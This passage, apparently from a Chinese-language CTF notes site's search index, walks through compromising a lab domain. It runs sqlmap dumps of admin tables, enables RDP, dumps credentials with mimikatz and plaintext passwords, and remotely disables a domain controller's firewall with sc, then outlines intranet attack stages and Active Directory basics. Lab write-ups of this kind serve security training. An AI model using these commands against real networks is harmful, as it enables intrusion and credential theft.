7\u8fdc\u7a0b\u5173\u95ed\u57df\u63a7\u7684\u9632\u706b\u5899\u4e86\u3002\u9996\u5148\u63a7\u5236\u7b2c\u4e8c\u5c42\u7f51\u7edc\u7684Windows 7\u4e0e\u57df\u63a7\u5efa\u7acbipc\u8fde\u63a5\uff1a</p> <pre><code>net use \\\\192.168.93.30\\ipc$ \"Whoami2021\" /user:\"Administrator\"\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u4f7f\u7528sc\u8fdc\u7a0b\u5728\u57df\u5236\u5668\uff08192.168.93.30\uff09\u4e0a\u521b\u5efa\u670d\u52a1\u5173\u95ed\u9632\u706b\u5899\uff1a</p> <pre><code>sc \\\\192.168.93.30 create unablefirewall binpath= \"netsh advfirewall set allprofiles state off\"\n\nsc \\\\192.168.93.30 start unablefirewall\n</code></pre> <p>\u518d\u6b21\u5c1d\u8bd5\u6267\u884c exploit/windows/smb/psexec \u6a21\u5757\u5373\u53ef\u6210\u529f\u767b\u5f55\uff1a</p> <p>\u6210\u529f\u62ff\u4e0b\u57df\u63a7\uff1a</p> <p></p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html","title":"\u94c1\u4e09\u57df\u63a7","text":"<p>\u9776\u673a\u5730\u5740:http://cloud-pentest.cn/index.html#</p> <p>\u7f51\u7edc\u62d3\u6251\u56fe:</p> <p></p> <p>\u5de5\u5177\u51c6\u5907:</p> <ul> <li>fscan</li> <li>gobuster</li> <li>sqlmap </li> <li>mimikatz</li> </ul>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#_2","title":"\u6e17\u900f\u6d41\u7a0b","text":"<p>fscan\u5f00\u626b:</p> <p></p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#172250141","title":"172.25.0.141","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# nmap --min-rate 10000 -p- -Pn 172.25.0.141\n...\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n...\n</code></pre> <p>\u7531fscan\u626b\u63cf\u7ed3\u679c\u53ef\u77e5\u8be5\u9776\u673a\u5b58\u5728ms17-010\u6f0f\u6d1e\uff0c\u5c1d\u8bd5\u8fdb\u884c\u5229\u7528\uff0c\u53d1\u73b0\u65e0\u6cd5\u5229\u7528\u6c38\u6052\u4e4b\u84dd \uff0c\u56e0\u4e3amsf\u5904\u7684ms17-010\u6f0f\u6d1e\u53ea\u80fd\u652f\u630164\u4f4d\u7684\uff0c\u4f46\u662f\u8fd9\u662f32\u4f4d\u7684win7\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0https://blog.csdn.net/qq_41617034/article/details/91051614\uff0c\u5229\u7528MS17-010\u6e17\u900fwin7\uff0832\u4f4d\uff09\uff0c\u4f46\u662f\u8fd8\u662f\u5931\u8d25\u4e86\uff0c\u672c\u5730\u590d\u73b0\u6210\u529f\u4e86\uff0c\u591a\u534a\u662f\u73af\u5883\u7684\u95ee\u9898\u3002</p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#172250123","title":"172.25.0.123","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# nmap --min-rate 10000 -p- -Pn 172.25.0.123 \n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n</code></pre> <p>,,,\u7ec7\u68a6CMS\u3002</p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#gobuster","title":"gobuster\u626b\u63cf\u654f\u611f\u76ee\u5f55","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x zip,rar,txt,php -u http://172.25.0.123/  \n...\n/images               (Status: 301) [Size: 235] [--&gt; http://172.25.0.123/images/]                                             \n/index                (Status: 200) [Size: 26190]\n/index.php            (Status: 200) [Size: 26190]\n/uploads              (Status: 301) [Size: 236] [--&gt; http://172.25.0.123/uploads/]                                            \n/data                 (Status: 301) [Size: 233] [--&gt; http://172.25.0.123/data/]                                               \n/a                    (Status: 301) [Size: 230] [--&gt; http://172.25.0.123/a/]                                                  \n/member               (Status: 301) [Size: 235] [--&gt; http://172.25.0.123/member/]                                             \n/special              (Status: 301) [Size: 236] [--&gt; http://172.25.0.123/special/]                                            \n/m                    (Status: 301) [Size: 230] [--&gt; http://172.25.0.123/m/]                                                  \n/tags.php             (Status: 200) [Size: 6232]\n/tags                 (Status: 200) [Size: 6232]\n/manual               (Status: 301) [Size: 235] [--&gt; http://172.25.0.123/manual/]                                             \n/plus                 (Status: 301) [Size: 233] [--&gt; http://172.25.0.123/plus/]                                               \n/include              (Status: 301) [Size: 236] [--&gt; http://172.25.0.123/include/]                                            \n/favicon              (Status: 200) [Size: 1150]\n/robots               (Status: 200) [Size: 505]\n/robots.txt           (Status: 200) [Size: 505]\n/sql                  (Status: 301) [Size: 232] [--&gt; http://172.25.0.123/sql/]    \n...\n</code></pre> <p>/sql\u611f\u89c9\u53ef\u4ee5\u5229\u7528</p> <p></p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#sql","title":"sql\u6ce8\u5165\u6f0f\u6d1e","text":"<p>\u626b\u51fa\u6765\u56db\u4e2a\u6570\u636e\u5e93</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# sqlmap -u http://172.25.0.123/sql/?id=1 --dbs\n\n[15:00:56] [INFO] fetching database names\navailable databases [4]:\n[*] dedecmsv57utf8sp1\n[*] information_schema\n[*] mysql\n[*] performance_schema\n</code></pre> <p>-D\u6307\u5b9a\u6570\u636e\u5e93\uff0c--tables\u7206\u8868</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# sqlmap -u http://172.25.0.123/sql/?id=2 -D dedecmsv57utf8sp1 --tables \n\nDatabase: dedecmsv57utf8sp1\n[89 tables]\n+-------------------------+\n| flag                    |\n| topsec_addonarticle     |\n| topsec_addonimages      |\n| topsec_addoninfos       |\n| topsec_addonshop        |\n| topsec_addonsoft        |\n| topsec_addonspec        |\n| topsec_admin            |\n| topsec_admintype        |\n| topsec_advancedsearch   |\n| topsec_arcatt           |\n| topsec_arccache         |\n| topsec_archives         |\n| topsec_arcmulti         |\n| topsec_arcrank          |\n| topsec_arctiny          |\n| topsec_arctype          |\n| topsec_area             |\n| topsec_channeltype      |\n| topsec_co_htmls         |\n| topsec_co_mediaurls     |\n| topsec_co_note          |\n| topsec_co_onepage       |\n| topsec_co_urls          |\n| topsec_diyforms         |\n| topsec_dl_log           |\n| topsec_downloads        |\n| topsec_erradd           |\n| topsec_feedback         |\n| topsec_flink            |\n| topsec_flinktype        |\n| topsec_freelist         |\n| topsec_homepageset      |\n| topsec_keywords         |\n| topsec_log              |\n| topsec_member           |\n| topsec_member_company   |\n| topsec_member_feed      |\n| topsec_member_flink     |\n| topsec_member_friends   |\n| topsec_member_group     |\n| topsec_member_guestbook |\n| topsec_member_model     |\n| topsec_member_msg       |\n| topsec_member_operation |\n| topsec_member_person    |\n| topsec_member_pms       |\n| topsec_member_snsmsg    |\n| topsec_member_space     |\n| topsec_member_stow      |\n| topsec_member_stowtype  |\n| topsec_member_tj        |\n| topsec_member_type      |\n| topsec_member_vhistory  |\n| topsec_moneycard_record |\n| topsec_moneycard_type   |\n| topsec_mtypes           |\n| topsec_multiserv_config |\n| topsec_myad             |\n| topsec_myadtype         |\n| topsec_mytag            |\n| topsec_payment          |\n| topsec_plus             |\n| topsec_plus_seoinfo     |\n| topsec_purview          |\n| topsec_pwd_tmp          |\n| topsec_ratings          |\n| topsec_scores           |\n| topsec_search_cache     |\n| topsec_search_keywords  |\n| topsec_sgpage           |\n| topsec_shops_delivery   |\n| topsec_shops_orders     |\n| topsec_shops_products   |\n| topsec_shops_userinfo   |\n| topsec_softconfig       |\n| topsec_sphinx           |\n| topsec_stepselect       |\n| topsec_sys_enum         |\n| topsec_sys_module       |\n| topsec_sys_set          |\n| topsec_sys_task         |\n| topsec_sysconfig        |\n| topsec_tagindex         |\n| topsec_taglist          |\n| topsec_uploads          |\n| topsec_verifies         |\n| topsec_vote             |\n| topsec_vote_member      |\n+-------------------------+\n</code></pre> <p>T\u6307\u5b9aflag\u8868\uff0c--dump\u7206\u51fa\u6240\u6709\u6570\u636e</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# sqlmap -u http://172.25.0.123/sql/?id=2 -D dedecmsv57utf8sp1 -T flag  --dump\n\nDatabase: dedecmsv57utf8sp1\nTable: flag\n[1 entry]\n+----+-----------------------------------------+\n| id | flag                                    |\n+----+-----------------------------------------+\n| 1  | flag2{912ec803b2ce49e4a541068d495ab570} |\n+----+-----------------------------------------+\n</code></pre> <pre><code>admin         | 7cd6ef195a0f7622a9c5 \u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# sqlmap -u http://172.25.0.123/sql/?id=2 -D dedecmsv57utf8sp1 -T topsec_admin  --dump\n\nDatabase: dedecmsv57utf8sp1\nTable: topsec_admin\n[2 entries]\n+----+---------+---------------+----------------------+---------+---------+---------------+--------------+----------+------------+\n| id | typeid  | userid        | pwd                  | email   | tname   | uname         | loginip      | usertype | logintime  |\n+----+---------+---------------+----------------------+---------+---------+---------------+--------------+----------+------------+\n| 1  | &lt;blank&gt; | admin         | 7cd6ef195a0f7622a9c5 | &lt;blank&gt; | &lt;blank&gt; | admin         | 192.168.50.1 | 10       | 1487739514 |\n| 2  | NULL    | administrator | topsec.123           | &lt;blank&gt; | &lt;blank&gt; | administrator | &lt;blank&gt;      | 10       | 0          |\n+----+---------+---------------+----------------------+---------+---------+---------------+--------------+----------+------------+\n</code></pre> <p>\u53ef\u4ee5\u627e\u5230\u8fd9\u4e2acms\u7684\u540e\u53f0\u7ba1\u7406\u767b\u5f55\u5730\u5740/dede/login.php</p> <p></p> <p>topsec_admin\u8868\u4e0b\u5b58\u5728\u540e\u53f0\u8d26\u53f7\u5bc6\u7801\uff0cadmin  | 7cd6ef195a0f7622a9c5   \uff0c\u6210\u529f\u7206\u7834\u51famd5\u503c\u3002</p> <p></p> <p>\u8fdb\u884c\u767b\u5f55\uff0c\u5728\u7ba1\u7406\u9875\u9762\u6210\u529f\u62ff\u4e0bflag1</p> <p></p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#3389141","title":"3389\u8fdc\u7a0b\u767b\u5f55141\u9776\u673a","text":"<p>windows\u6253\u5f003389\u8fdc\u7a0b\u8fde\u63a5\u7684\u547d\u4ee4\u6709\u4e24\u79cd\u529e\u6cd5\uff0c\u4efb\u9009\u5176\u4e00\uff1a</p> <p>wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1</p> <p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p> <p>\u5229\u7528\u7206\u7834\u51fa\u7684administrator | topsec.123   \u5c1d\u8bd5\u8fdc\u7a0b\u767b\u5f55141\u9776\u673a\u3002</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# rdesktop 172.25.0.141\n</code></pre> <p></p> <p></p> <p>ipconfig \u770b\u5230\u65b0\u7684\u57df</p> <p></p> <p>\u53d1\u73b0DNS\u670d\u52a1\u5668\u548c\u7f51\u5173\u90fd\u662f192.168.60.100\uff0c\u90a3\u57df\u63a7\u7684ip\u5e94\u8be5\u5c31\u662f\u8fd9\u4e2a\u4e86\u3002</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u8be5\u9776\u673a\u662f32\u4f4d\u7684\u3002</p> <p></p> <p>\u6ce8\u610f\uff1a\u4e0a\u4f20fscan32.exe\u65f6\u5efa\u8bae\u4f7f\u7528windows\u8fde\u63a5VPN\uff0c\u4e4b\u540e\u590d\u5236\u4e0a\u4f20\u3002</p>"},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#19216860100","title":"192.168.60.100","text":""},{"location":"CTF/HTB/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/index.html#mimikatz","title":"mimikatz","text":"<p>192.168.60.100\u5c31\u662f\u57df\u63a7\u7684ip\uff0c\u90a3\u6211\u4eec\u8981\u5982\u4f55\u62ff\u4e0b\u57df\u63a7\u5462\uff1f\u4e00\u822c\u6765\u8bb2\u6211\u4f1a\u5148\u7528mimikatz\u628a\u5f53\u524d\u8fd9\u53f0\u673a\u5b50\u7684\u5bc6\u7801\u54c8\u5e0c\u51ed\u636e\u4ec0\u4e48\u7684\u5148\u7ed9\u6574\u4e0b\u6765\uff0c\u770b\u770b\u80fd\u4e0d\u80fd\u76f4\u63a5\u9760\u8fd9\u4e9b\u4fe1\u606f\u767b\u5f55\u57df\u63a7\uff0c\u5982\u679c\u4e0d\u884c\u5728\u53bb\u60f3\u522b\u7684\u529e\u6cd5\uff0c\u6216\u8005\u642d\u5efa\u4e2a\u96a7\u9053\u5229\u7528fscan\u626b\u51fa\u6765\u7684\u8fd9\u4e2ams17-010\u6f0f\u6d1e\u62ff\u4e0b\u57df\u63a7\u3002 \u601d\u8def\u660e\u786e\uff0c\u6211\u672c\u6765\u8fd8\u60f3\u7740\u8fd9\u4e2amimikatz\u8981\u6211\u81ea\u5df1\u4e0a\u4f20\uff0c\u7ed3\u679c\u53d1\u73b0\u684c\u9762\u4e0a\u7684win32\u6587\u4ef6\u5939\u91cc\u81ea\u5e26\u4e86mimikatz\uff0c\u597d\u5bb6\u4f19\u8fd9\u5e94\u8be5\u662f\u9898\u76ee\u7ed9\u7684\u63d0\u793a\u5427</p> <pre><code>  .#####.   mimikatz 2.1 (x86) built on Nov 26 2016 02:28:17\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 20 modules * * */\n\nmimikatz # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # privilege::debug    //\u7528\u4e8e\u63d0\u5347\u81f3DebugPrivilege\u6743\u9650\nPrivilege '20' OK\n\nmimikatz # sekurlsa::logonpasswords full       //\u7528\u4e8e\u5bfc\u51fa\u7528\u6237\u51ed\u636e\n\nAuthentication Id : 0 ; 550594 (00000000:000866c2)\nSession           : RemoteInteractive from 3\nUser Name         : administrator\nDomain            : TEST\nLogon Server      : WIN-JDS94C5QEQQ\nLogon Time        : 2023/4/16 21:15:25\nSID               : S-1-5-21-3162112726-21061240-2166559086-500\n        msv :\n         [00000003] Primary\n         * Username : Administrator\n         * Domain   : TEST\n         * LM       : 3264d00d3f2d8530fb62879e33fbb745\n         * NTLM     : 9d5161ebc56e27949f872f96cdb95490\n         * SHA1     : 76403c35658baf605b4d10ee4d015d1fcaef59da\n        tspkg :\n         * Username : Administrator\n         * Domain   : TEST\n         * Password : TopSec_2017\n        wdigest :\n         * Username : Administrator\n         * Domain   : TEST\n         * Password : TopSec_2017\n        kerberos :\n         * Username : administrator\n         * Domain   : TEST.COM\n         * Password : TopSec_2017\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 365921 (00000000:00059561)\nSession           : RemoteInteractive from 2\nUser Name         : Administrator\nDomain            : TOPSEC\nLogon Server      : TOPSEC\nLogon Time        : 2023/4/16 21:05:36\nSID               : S-1-5-21-3220505158-1983987487-2792417607-500\n        msv :\n         [00000003] Primary\n         * Username : Administrator\n         * Domain   : TOPSEC\n         * LM       : 7dafe6af0d82ef56ccf9155e3e7db453\n         * NTLM     : f013ff76154a124f8cfc32f654582420\n         * SHA1     : 8f2e87185cbe8a3e3aed2f409f5017d9e12036c1\n        tspkg :\n         * Username : Administrator\n         * Domain   : TOPSEC\n         * Password : topsec.123\n        wdigest :\n         * Username : Administrator\n         * Domain   : TOPSEC\n         * Password : topsec.123\n        kerberos :\n         * Username : Administrator\n         * Domain   : TOPSEC\n         * Password : topsec.123\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2023/4/16 21:04:33\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : TOPSEC$\nDomain            : TEST\nLogon Server      : (null)\nLogon Time        : 2023/4/16 21:04:33\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : TOPSEC$\n         * Domain   : TEST\n         * NTLM     : ec572542a28c795e4e43654a0f307db6\n         * SHA1     : ae24e2864124ad6dcb67e04ea742fc89c5fd6217\n        tspkg :\n        wdigest :\n         * Username : TOPSEC$\n         * Domain   : TEST\n         * Password : atl$&lt;'q+Vn_?i qEGh/q^k$NIE1C]@&amp;WCmHcYjMH/t9#6Sx'o.hb^r:w]u\nquI^UI'_U#7Z)FZN8:mGy_X&amp;HK8^7W*[Mi]rs$-/67&amp;/t9LXRfp!1usS4+^I&amp;\n        kerberos :\n         * Username : topsec$\n         * Domain   : TEST.COM\n         * Password : atl$&lt;'q+Vn_?i qEGh/q^k$NIE1C]@&amp;WCmHcYjMH/t9#6Sx'o.hb^r:w]u\nquI^UI'_U#7Z)FZN8:mGy_X&amp;HK8^7W*[Mi]rs$-/67&amp;/t9LXRfp!1usS4+^I&amp;\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 50816 (00000000:0000c680)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2023/4/16 21:04:32\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : TOPSEC$\n         * Domain   : TEST\n         * NTLM     : ec572542a28c795e4e43654a0f307db6\n         * SHA1     : ae24e2864124ad6dcb67e04ea742fc89c5fd6217\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : TOPSEC$\nDomain            : TEST\nLogon Server      : (null)\nLogon Time        : 2023/4/16 21:04:32\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : TOPSEC$\n         * Domain   : TEST\n         * Password : atl$&lt;'q+Vn_?i qEGh/q^k$NIE1C]@&amp;WCmHcYjMH/t9#6Sx'o.hb^r:w]u\nquI^UI'_U#7Z)FZN8:mGy_X&amp;HK8^7W*[Mi]rs$-/67&amp;/t9LXRfp!1usS4+^I&amp;\n        kerberos :\n         * Username : topsec$\n         * Domain   : TEST.COM\n         * Password : atl$&lt;'q+Vn_?i qEGh/q^k$NIE1C]@&amp;WCmHcYjMH/t9#6Sx'o.hb^r:w]u\nquI^UI'_U#7Z)FZN8:mGy_X&amp;HK8^7W*[Mi]rs$-/67&amp;/t9LXRfp!1usS4+^I&amp;\n        ssp :\n        credman :\n</code></pre> <p>\u627e\u5230\u4e86\u4e00\u4e2atest\u57df\u7684administrator\u7528\u6237\u548c\u5bc6\u7801\uff0c\u76f4\u63a5\u8fdc\u7a0b\u684c\u9762\u91cc\u5957\u4e00\u5c42\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u57df\u63a7\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/index.html","title":"Intranet_security","text":"<p>\u5185\u7f51\u6e17\u900f\u5206\u4e3a\u57df\u6e17\u900f\u548c\u5de5\u4f5c\u7ec4\u6e17\u900f\u4e24\u7c7b\uff0c\u4ea6\u5206\u4e3a\u57df\u73af\u5883\u548c\u975e\u57df\u73af\u5883\u6e17\u900f\u3002</p> <p>\u4e0e\u5916\u7f51\u6e17\u900f\u533a\u522b: 1.\u5916\u7f51\u6e17\u900f\u66f4\u4fa7\u91cd\u4e8e\u627e\u6f0f\u6d1e\u5bfb\u627e\u7a81\u7834\u53e3\uff0c\u8003\u9a8c\u7684\u662f\u767d\u5e3d\u7684\u7efc\u5408\u80fd\u529b,\u5916\u7f51\u6e17\u900f\u7684\u6700\u7ec8\u76ee\u7684\u8fd8\u662f\u4e3a\u4e86\u8fdb\u5165\u5185\u7f51 2.\u5185\u7f51\u6e17\u900f\u66f4\u4fa7\u91cd\u4e8e\u5bf9\u76ee\u6807\u7684\u719f\u6089\u7a0b\u5ea6,\u5bf9\u73af\u5883\u662f\u5426\u8db3\u591f\u719f\u6089?\u5bf9\u76ee\u6807\u7684\u60c5\u51b5\u662f\u5426\u4e86\u7136\u4e8e\u80f8?\u54ea\u91cc\u6709\u654f\u611f\u4fe1\u606f\u7b49\u7b49\u3002</p> <p>\u4fe1\u606f\u641c\u96c6:\u5de5\u4f5c\u7ec4,\u57df\u6536\u96c6(\u5bc6\u7801\u53e3\u4ee4,\u7f51\u7edc\u73af\u5883,\u8d44\u4ea7\u5e94\u7528\u7b49) \u9690\u533f\u653b\u51fb:\u7aef\u53e3\u8f6c\u53d1,\u8df3\u677f\u8f6c\u53d1,\u96a7\u9053\u7a7f\u900f,\u51fa\u7f51\u534f\u8bae\u5224\u65ad(\u5e38\u89c1\u5de5\u5177) \u6743\u9650\u63d0\u5347:\u5185\u6838(\u571f\u8c46\u7cfb),\u6570\u636e\u5e93,\u4e09\u65b9\u8f6f\u4ef6,bypassUAC,Linux\u63d0\u6743\u6280\u672f\u7b49 \u6a2a\u5411\u79fb\u52a8:\u53e3\u4ee4HASH\u55b7\u5c04,\u8fb9\u754c\u5e94\u7528,\u59d4\u6d3e\u653b\u51fb,Exchange\u653b\u9632,Kerberos\u653b\u51fb,\u57df\u63a7\u6f0f\u6d1e\u7b49 \u6743\u9650\u7ef4\u6301:\u7cfb\u7edf\u540e\u95e8,WEB\u540e\u95e8(\u5185\u5b58\u9a6c),\u7968\u636e\u6ce8\u5165,Rookit\u6280\u672f,Linux\u7ef4\u6301\u6280\u672f \u75d5\u8ff9\u5904\u7406:\u65e5\u5fd7\u6e05\u9664,\u7834\u574f\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd</p> <ul> <li>\u57df\u6e17\u900f\u653b\u9632</li> <li>\u57df\u5185\u7f51\u7a7f\u900f\u6280\u672f</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/index.html","title":"Domain_AD","text":"<ul> <li>\u534f\u8bae\u8bb2\u89e3</li> <li>\u57df\u57fa\u7840\u77e5\u8bc6</li> <li>\u57df\u5185\u6e17\u900f\u624b\u6cd5</li> <li>\u57df\u5185\u6f0f\u6d1e\u548c\u5229\u7528</li> <li>\u57df\u6743\u9650\u7ef4\u6301\u4e0e\u540e\u6e17\u900f\u5bc6\u7801\u6536\u96c6</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/index.html","title":"\u57df\u57fa\u7840\u77e5\u8bc6","text":"<p>\u4ecb\u7ecd\u5728\u5b66\u4e60\u57df\u6e17\u900f\u7684\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u3002</p> <ul> <li>\u57df\u4e2d\u5e38\u89c1\u540d\u8bcd</li> <li>\u5de5\u4f5c\u7ec4\u548c\u57df</li> <li>\u57df\u4fe1\u4efb</li> <li>\u670d\u52a1\u4e3b\u4f53\u540d\u79f0 SPN</li> <li>\u57df\u4e2d\u7684\u7ec4\u7b56\u7565</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html","title":"\u57df\u4e2d\u5e38\u89c1\u540d\u8bcd","text":"<p>\u5728\u5b66\u4e60\u57df\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\u4e00\u4e9b\u4e13\u6709\u540d\u8bcd\uff0c\u5982\uff1aAD\u3001CN\u3001OU\u3001DN \u7b49\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article1/index.html#ad","title":"AD","text":"<p>AD\u662fActive Directory\u6d3b\u52a8\u76ee\u5f55\u7684\u7f29\u5199\u3002\u6211\u4eec\u5148\u6765\u770b\u770b\u4ec0\u4e48\u662f\u6d3b\u52a8\u76ee\u5f55\u3002\u65e5\u5e38\u751f\u6d3b\u4e2d\u6211\u4eec\u7684\u7535\u8bdd\u672c\u8bb0\u5f55\u7740\u4eb2\u670b\u597d\u53cb\u7684\u7535\u8bdd\u548c\u59d3\u540d\u7b49\u6570\u636e\uff0c\u8fd9\u5c31\u662f Telephone Directory \u7535\u8bdd\u76ee\u5f55\uff1b\u8ba1\u7b97\u673a\u4e2d\u7684\u6587\u4ef6\u7cfb\u7edf\u8bb0\u5f55\u7740\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u3001\u5927\u5c0f\u548c\u65e5\u671f\u7b49\u6570\u636e\uff0c\u8fd9\u5c31\u662f File Directory \u6587\u4ef6\u76ee\u5f55\u3002\u800cActive Directory \u6d3b\u52a8\u76ee\u5f55\u662f\u5fae\u8f6f\u5bf9\u901a\u7528\u76ee\u5f55\u670d\u52a1\u7684\u5b9e\u73b0\uff0c\u5b83\u4f7f\u7528LDAP\u4f5c\u4e3a\u5176\u4e3b\u8981\u8bbf\u95ee\u534f\u8bae\u3002\u6d3b\u52a8\u76ee\u5f55\u5b58\u50a8\u7740\u6709\u5173\u7f51\u7edc\u4e2d\u5404\u79cd\u5bf9\u8c61\u7684\u4fe1\u606f\uff0c\u5982\u7528\u6237\u8d26\u6237\uff0c\u8ba1\u7b97\u673a\u8d26\u6237\uff0c\u7ec4\u548cKerberos\u4f7f\u7528\u7684\u6240\u6709\u76f8\u5173\u51ed\u636e\u7b49\u4fe1\u606f\u3002\u6d3b\u52a8\u76ee\u5f55\u8ba9\u7ba1\u7406\u5458\u548c\u7528\u6237\u80fd\u591f\u8f7b\u677e\u5730\u67e5\u627e\u548c\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\u3002\u6d3b\u52a8\u76ee\u5f55\u670d\u52a1(AD DS ,Active Dirctory Domain Service)\u662fWindows Server 2000 \u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u4e2d\u5fc3\u7ec4\u4ef6\u4e4b\u4e00\uff0c\u6d3b\u52a8\u76ee\u5f55\u53ef\u4ee5\u4f5c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1(ADDS)\u6216\u6d3b\u52a8\u76ee\u5f55\u8f7b\u578b\u76ee\u5f55\u670d\u52a1(ADLDS)\u90e8\u7f72\u3002\u6d3b\u52a8\u76ee\u5f55\u4f7f\u7528\u4e86\u4e00\u79cd\u7ed3\u6784\u5316\u7684\u6570\u636e\u5b58\u50a8\u65b9\u5f0f\uff0c\u5e76\u4ee5\u6b64\u4f5c\u4e3a\u57fa\u7840\u5bf9\u76ee\u5f55\u4fe1\u606f\u8fdb\u884c\u5408\u4e4e\u903b\u8f91\u7684\u5206\u5c42\u7ec4\u7ec7\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u770b\u51fa\uff0cAcitive Directory \u5176\u5b9e\u5c31\u662f\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\u3002\u76ee\u5f55\u670d\u52a1\u6570\u636e\u5e93\u4e5f\u662f\u4e00\u79cd\u6570\u636e\u5e93\uff0c\u8fd9\u79cd\u6570\u636e\u5e93\u76f8\u6bd4\u8f83\u4e8e\u6211\u4eec\u719f\u77e5\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93(\u6bd4\u5982MySQL,SQLServer,Oracle)\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u7684\u7279\u70b9\u3002</p> <ol> <li>\u5b83\u6210\u6811\u72b6\u7ed3\u6784\u7ec4\u7ec7\u6570\u636e\uff0c\u7c7b\u4f3c\u6587\u4ef6\u76ee\u5f55\u4e00\u6837\u3002</li> <li>\u5b83\u662f\u4e3a\u67e5\u8be2\u3001\u6d4f\u89c8\u548c\u641c\u7d22\u800c\u4f18\u5316\u7684\u6570\u636e\u5e93\uff0c\u4e5f\u5c31\u662f\u8bf4\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u7684\u8bfb\u6027\u80fd\u7279\u522b\u5f3a\uff0c\u4f46\u662f\u5199\u6027\u80fd\u5dee\uff0c\u800c\u4e14\u8fd8\u4e0d\u652f\u6301\u4e8b\u52a1\u5904\u7406\u3001\u56de\u6eda\u7b49\u590d\u6742\u529f\u80fd\u3002</li> 